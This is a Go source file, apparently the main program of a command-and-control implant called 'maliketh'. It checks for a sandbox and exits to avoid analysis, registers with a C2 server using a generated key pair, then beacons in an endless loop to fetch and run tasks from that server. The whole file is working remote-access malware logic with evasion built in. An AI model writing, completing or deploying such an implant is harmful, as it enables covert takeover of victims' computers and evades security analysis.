package main

import (
	"fmt"
	config "maliketh/pkg/config"
	"maliketh/pkg/crypto"
	"maliketh/pkg/implant"
	"maliketh/pkg/sandbox"
	. "maliketh/pkg/utils"
	"time"
)

func main() {

	if !config.DEBUG {
		if sandbox.SandboxAll() {
			DebugPrintln("Sandbox detected, exiting...")
			return
		}
	}

	public, private, err := crypto.CreateBase64KeyPair()
	if err != nil {
		DebugPrintln("Error creating key pair")
		return
	}

	DebugPrintln(fmt.Sprintf("Public key: %s", public))
	DebugPrintln(fmt.Sprintf("Private key: %s", private))

	profile, err := implant.Register(config.GetC2Url(), public, private)
	if err != nil {
		panic(err)
	}
	config.CurrentProfile = &profile

	for {
		time.Sleep(time.Duration(config.CurrentProfile.Config.Sleep) * time.Second)
		task, err := implant.Checkin(config.GetC2Url(), *config.CurrentProfile)
		if err != nil {
			panic(err)
		}
		// DebugPrintln(fmt.Sprintf("Task ID: %s\n", task.TaskId))
		// opcode := task.Opcode
		// DebugPrintln(fmt.Sprintf("Opcode: %d\n", opcode))

		go implant.Handle(config.GetC2Url(), task, *config.CurrentProfile)
	}
}
